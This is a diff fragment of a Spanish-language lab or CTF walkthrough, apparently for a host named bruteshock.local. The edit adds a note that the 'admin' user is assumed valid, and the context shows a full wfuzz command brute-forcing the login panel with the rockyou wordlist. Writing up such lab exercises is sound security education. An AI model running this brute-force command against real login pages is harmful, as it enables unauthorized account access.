@@ -115,7 +115,7 @@ Pero no obtendremos resultados interesantes, en este punto podemos intentar hace
 ---
 ## Brute Force
 
-Intentaremos encontrar la contraseña de un usuario `admin` a través de un ataque de fuerza bruta al panel de autenticación usando `wfuzz`
+Intentaremos encontrar la contraseña de un usuario `admin` (suponiendo que es válido) a través de un ataque de fuerza bruta al panel de autenticación usando `wfuzz`
 
 ~~~ bash
 wfuzz -c --hl 69 -H "Cookie: PHPSESSID=p94n4hgjjvq1ti9f7relhhdh06" -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -t 200 http://bruteshock.local/
